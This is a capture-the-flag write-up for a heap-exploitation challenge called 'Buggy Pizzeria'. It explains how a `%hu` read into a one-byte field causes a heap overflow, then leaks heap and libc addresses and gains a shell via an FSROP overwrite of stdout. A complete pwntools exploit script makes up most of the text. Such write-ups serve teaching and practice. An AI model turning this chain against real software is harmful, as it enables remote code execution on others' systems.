# Buggy Pizzeria

## Description

>It looks like I've received the wrong pizza, everything looks so confusingly wrong and messy. Can you figure it out for me, please?
>
>Oh yeah, no pineapple btw!

## Analysis

### Checksec

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

The binary has all the common mitigations enabled.

### Reversing

The binary is a simple pizzeria simulator which allows you to order custom pizzas.
Up to three pizzas are stored as pointers in a `pizza_order` array allocated in the `.bss` section and are represented as follows:

```c
struct pizza_t {
    float price;
    uint16_t order_num;
    uint8_t baked;
    uint8_t type;

    uint16_t name_size;
    uint8_t pad[6];
    char *name;

    uint16_t desc_size;
    uint8_t pad2[6];
    char *desc;
}
```

The first option allows you to create a new pizza by specifying the order number, the name on the order, the pizza type and the description. Both the order name and the description can be up to 255 characters long, while the type can be between 0 and 2.

Both the second and the third option allow you to `free` your pizza and the associated `name` and `desc` buffers.

The fourth option allows you to modify both the `name` and the `desc` buffers of a pizza once. Doing so will set the `baked` flag, which denies further modifications.

The fifth option allows you to print the `name` and the `desc` buffers of a pizza.

Finally, the sixth option lets you exit the program if you have no pizzas allocated.

### Vunerabilities

The `read_num` function is used by the binary to get numbers from the user. The function is defined as follows:

```c
void read_num(void *val) {
  char buffer[16];

  if (fgets(buffer, 16, stdin) == NULL)
    err(...);
  if (sscanf(buffer, "%hu", val) != 1)
    err(...);
}
```

The `%hu` format specifier is used, which means that values will be treaded as unsigned shorts (2 bytes). This is fine since most of the times the function is used on `short` or `int` variables, however it is also used for the `type` field, which is only one byte long. This means that the most significant byte read will overflow into the adjacent field, which is `name_size`. This leads to a heap buffer overflow on the `name` buffer.

## Exploitation

The provided libc is `2.35`, thus `tcache` is available and will be used to store all the chunks freed by the binary (since their size is never greater than 0x100). We also can't have more than seven chunks of the same size at the same time.

### Leaking heap base

Allocating two pizzas will give the following layout:

```
+----------------------+
| pizza_order[0]       |
+----------------------+
| pizza_order[0]->name |
+----------------------+
| pizza_order[0]->desc |
+----------------------+
| pizza_order[1]       |
+----------------------+
| pizza_order[1]->name |
+----------------------+
| pizza_order[1]->desc |
+----------------------+
```

Using the overflow we can modify some fields in the `pizza_order[1]` struct in order to leak a heap address. If we have a chunk at an address ending with `00` this becomes trivial as we can just make the last byte of `pizza_order[1]->name` zero and free the chuck. Now we can just call the `Show orders` option and read the chunk's `fd` pointer, which will be `heap_addr >> 12` if no other chunk is present in that tcache bin.

### Leaking libc base

Knowing the heap base, we can try something similar to leak libc.
The idea is to fake a big chunk (~ 0x400 size) and free it to get it in an unsorted bin. 
We can do this by allocating two pizzas using 0xff size for both name and description.
Now if we trigger the overflow again we can replace one of the chunk's sizes with a big one and let the program free it. As always, we can get the address as the `name` field of a pizza and use `Show orders` to leak the contents. The freed chunk will end up in the unsorted bin and its fd will point to a libc address.

### Shell

Now, following the same ideas, we can overwrite one of the buffers to point to `_IO_2_1_stdout_` and use the [angry FSROP](https://blog.kylebot.net/2022/10/22/angry-FSROP/) technique in order to pop an easy shell.

Leaking the stack through libc variables and ropping is also a possibility.

### Final Exploit

```python
#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "localhost"
PORT = args.PORT if args.PORT else 1337

exe = ELF("./pizzeria")
libc = ELF("./libc.so.6")

context.binary = exe

gdbscript = """
"""


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r


def add_pizza(
    idx: int, name_len: int, name: bytes, type: int, desc_len: int, desc: bytes
):
    r.sendlineafter(b" > ", b"1")
    r.sendlineafter(b"number? ", str(idx).encode())
    r.sendlineafter(b"name? ", str(name_len).encode())
    r.sendafter(b"Name please: ", name)
    r.sendlineafter(b" > ", str(type).encode())
    r.sendlineafter(b"the description? ", str(desc_len).encode())
    r.sendafter(b"on the pizza: ", desc)
    r.recvuntil(b"going to be baked and ready soon!\n")


def free_pizza(idx: int):
    r.sendlineafter(b" > ", b"2")
    r.sendlineafter(b"number? ", str(idx).encode())


def modify_pizza(idx: int, name: bytes, desc: bytes, hax=False):
    r.sendlineafter(b" > ", b"4")
    r.sendlineafter(b"number? ", str(idx).encode())
    r.sendafter(b"Who's the order for now? ", name)
    if not hax:
        r.sendafter(b"on the pizza? ", desc)
        r.recvuntil(b"It's now going into the oven!\n")


def get_leak(idx: int = 0) -> bytes:
    r.sendlineafter(b" > ", b"5")
    for _ in range(idx + 1):
        r.recvuntil(b"Order name: ")
    leak = r.recvuntil(b"Description: ", drop=True).strip()
    r.recvline()
    return leak


def fsrop():
    fs = FileStructure()
    fs.flags = 0x3B01010101010101
    fs._IO_read_ptr = u64(b"/bin/sh\x00")
    fs._wide_data = libc.sym["_IO_2_1_stdout_"] + 0x10
    fs._lock = libc.sym["_IO_stdfile_1_lock"]
    fs.vtable = libc.sym["_IO_wstr_jumps"] + 160

    return (
        bytes(fs)
        + p64(libc.sym["system"])
        + p64(0)
        + p64(libc.sym["_IO_2_1_stdout_"] + 0x78)
    )


def main():
    global r
    r = conn()

    modify_payload = (
        b"A" * 40  # name
        + p64(0x21)  # desc size
        + b"B" * 24  # desc
        + p64(0x31)  # pizza chk size
        + p32(0)  # price
        + p16(1)  # id
        + p8(0)  # is_ready
        + p8(0x2)  # type
        + p64(0xFF)  # name_len
    )

    log.info("leaking heap base...")

    add_pizza(
        0, 0x20, b"A" * 0x1F, (len(modify_payload) + 1) << 8 | 0x02, 0x10, b"B" * 0xF
    )
    add_pizza(1, 0x10, b"C" * 0xF, 0xFF << 8 | 0x02, 0x10, b"D" * 0xF)

    modify_pizza(
        0, modify_payload, b"B" * 0xF
    )  # Overwrite last byte of name_buf to point to a freed chunk to leak the heap
    free_pizza(0)  # free the chunk in question

    heap_base = u64(get_leak().ljust(8, b"\x00")) << 12
    log.warn(f"heap base @ {hex(heap_base)}")

    modify_payload = (
        b"A" * 40  # name
        + p64(0x21)  # desc size
        + b"B" * 24  # desc
        + p64(0x31)  # pizza chk size
        + p32(0)  # price
        + p16(1)  # id
        + p8(0)  # is_ready
        + p8(0x2)  # type
        + p64(0xFF)  # name_len
        + p64(heap_base + 0x350)
    )[:-1]

    log.info("faking chunk size to leak libc...")

    add_pizza(
        0, 0x20, b"A" * 0x1F, (len(modify_payload) + 1) << 8 | 0x02, 0x10, b"B" * 0xF
    )
    modify_pizza(0, modify_payload, b"B" * 0xF)  # Fix pizza 1 to free it properly
    free_pizza(0)

    add_pizza(0, 0xFF, b"A" * 0xFE, 0xFF << 8 | 0x02, 0xFF, b"B" * 0xFE)
    add_pizza(2, 0xFF, b"E" * 0xFE, 0xFF << 8 | 0x02, 0xFF, b"F" * 0xFE)

    # fake size = 0x440

    free_pizza(1)

    modify_payload = (
        b"C" * 24
        + p64(0x21)  # name
        + p64((heap_base >> 12) ^ (heap_base + 0x300))  # free chunk size
        + p64(0)  # right fd ptr to avoid breaking the tcache
        + p64(0)  # key technically but we don't care
        + p64(0x441)  # pad (prev_size)  # corrupted size
    )[:-1]

    add_pizza(
        1, 0x10, b"C" * 0xF, (len(modify_payload) + 1) << 8 | 0x02, 0x30, b"D" * 0x2F
    )  # Avoid consolidation of the big chunks
    modify_pizza(
        1, modify_payload, b"D" * 0x2F
    )  # Overwrite 0x110 chunk's size to be 0x440

    log.info("freeing fake chunk...")

    free_pizza(0)  # Free corrupted chunk (0x440) and make it end into an unsorted bin
    # unsorted chunk @ heap_base + 0x390
    free_pizza(2)  # not like we care

    modify_payload = (
        b"A" * 40
        + p64(0x31)  # name
        + p32(0)  # pizza chk size
        + p16(0)  # price
        + p8(0)  # id
        + p8(0x2)  # is_ready
        + p64(0xFF)  # type
        + p64(  # name_len
            heap_base + 0x390
        )  # overwrite the name ptr to the unsorted bin to leak libc
    )[:-1]

    log.info("overwriting ptr to the unsorted chunk...")

    add_pizza(
        2, 0x20, b"E" * 0x1F, (len(modify_payload) + 1) << 8 | 0x02, 0x10, b"F" * 0xF
    )  # Alloc new chunk to edit a pizza
    modify_pizza(
        2, modify_payload, b"F" * 0xF
    )  # Overwrite the name ptr to the unsorted bin to leak libc

    libc.address = u64(get_leak(1).ljust(8, b"\x00")) - (libc.sym["main_arena"] + 96)
    log.warn(f"libc leak @ {hex(libc.address)}")

    log.info("overwriting stdout to fsrop...")

    modify_payload = (
        b"A" * 24
        + p64(0x31)  # name
        + p32(0)  # pizza chk size
        + p16(0)  # price
        + p8(0)  # id
        + p8(0x2)  # is_ready
        + p64(0xFF)  # type
        + p64(libc.sym["_IO_2_1_stdout_"])  # name_len  # overwrite stdout to fsrop
    )[:-1]

    add_pizza(
        0, 0x10, b"A" * 0xF, (len(modify_payload) + 1) << 8 | 0x02, 0x10, b"B" * 0xF
    )  # Alloc new chunk to edit pizza
    modify_pizza(0, modify_payload, b"B" * 0xF)  # Overwrite stdout to fsrop

    modify_pizza(
        1, fsrop() + b"\n", b"D" * 0x2F, hax=True
    )  # Overwrite stdout vtable to fsrop

    r.clean()
    r.sendline(b"cat flag.txt")
    log.success(r.recvregex(b"snakeCTF{.*}", timeout=5).decode().strip())


if __name__ == "__main__":
    main()

```
